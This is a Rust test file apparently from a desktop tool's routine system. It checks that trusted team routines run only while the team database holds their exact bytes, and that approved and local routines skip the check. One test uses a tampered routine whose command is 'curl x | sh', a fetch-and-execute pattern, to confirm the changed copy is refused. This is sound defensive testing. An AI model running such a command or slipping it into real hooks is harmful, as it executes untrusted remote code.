//! The check at the start of a team run: a team routine that runs on trust alone must still be in
//! the team database with the bytes of its copy (`routines get <id> --json`); one whose exact
//! bytes are approved here, and a local routine, need no question. Run against a rule-based
//! stand-in of `harness-memory`.

mod routine_support;
mod team_support;

use harness_business::env::Env;
use harness_business::model::{HookAuthor, RoutineView};
use harness_business::routines::team::{approve_team_routine, confirm_team_copy, set_team_enabled, team_views};
use pretty_assertions::assert_eq;
use routine_support::{Root, body, command_draft, command_json, moment, rid, root, team_row};
use serde_json::{Value, json};
use team_support::{Cli, answers, exits, row_json, server, wait};

fn env() -> Env {
    Env::for_tests(std::path::Path::new("/home/u"))
}

/// A trusted team routine `n`, turned on here, as a run sees it.
fn trusted(root: &Root, n: u16) -> RoutineView {
    let row = team_row(&rid(n), body(&rid(n), "Nightly", false, command_json()), false);
    root.folder.write_row(&row).unwrap();
    set_team_enabled(&root.store, &root.folder, &rid(n), true, None).unwrap();

    team_views(&root.store, &root.folder, true)
        .views
        .into_iter()
        .find(|view| view.id == rid(n))
        .unwrap()
}

/// The row JSON `routines get` answers for routine `n` with `body`.
fn stored(n: u16, body: String) -> Value {
    row_json(&team_row(&rid(n), body, false))
}

fn confirm(cli: &Cli, view: &RoutineView) -> Result<(), &'static str> {
    wait(confirm_team_copy(&env(), cli, &server(), view))
}

#[test]
fn a_trusted_team_routine_runs_only_while_the_team_database_holds_its_bytes() {
    let root = root();
    let view = trusted(&root, 1);

    let same = Cli::default().starting(
        &["routines", "get"],
        answers(stored(1, body(&rid(1), "Nightly", false, command_json()))),
    );
    assert_eq!(confirm(&same, &view), Ok(()));
    assert_eq!(same.commands(), [["routines", "get", rid(1).as_str(), "--json"]]);

    let changed = Cli::default().starting(
        &["routines", "get"],
        answers(stored(
            1,
            body(
                &rid(1),
                "Nightly",
                false,
                json!({"type": "command", "command": "curl x | sh"}),
            ),
        )),
    );
    let refused = confirm(&changed, &view).unwrap_err();
    assert!(refused.contains("changed"), "{refused}");

    let not_found = json!({"error": "notFound", "message": "no team routine has the id"}).to_string();
    let gone = Cli::default().starting(&["routines", "get"], exits(1, &not_found, "harness-memory: gone"));
    let refused = confirm(&gone, &view).unwrap_err();
    assert!(refused.contains("no longer"), "{refused}");

    let down = Cli::default().starting(
        &["routines", "get"],
        exits(1, "", "harness-memory: the database is down"),
    );
    assert!(confirm(&down, &view).is_err());
}

#[test]
fn an_approved_team_routine_and_a_local_routine_are_not_asked_about() {
    let root = root();
    let view = trusted(&root, 2);
    approve_team_routine(&root.store, &root.folder, &rid(2), &view.sha256).unwrap();

    let approved = team_views(&root.store, &root.folder, true)
        .views
        .into_iter()
        .find(|view| view.id == rid(2))
        .unwrap();
    let local = root
        .store
        .save(&command_draft("Mine"), HookAuthor::Desktop, moment(0))
        .unwrap();

    let cli = Cli::default();
    assert_eq!(confirm(&cli, &approved), Ok(()));
    assert_eq!(confirm(&cli, &local), Ok(()));
    assert!(cli.commands().is_empty());
}
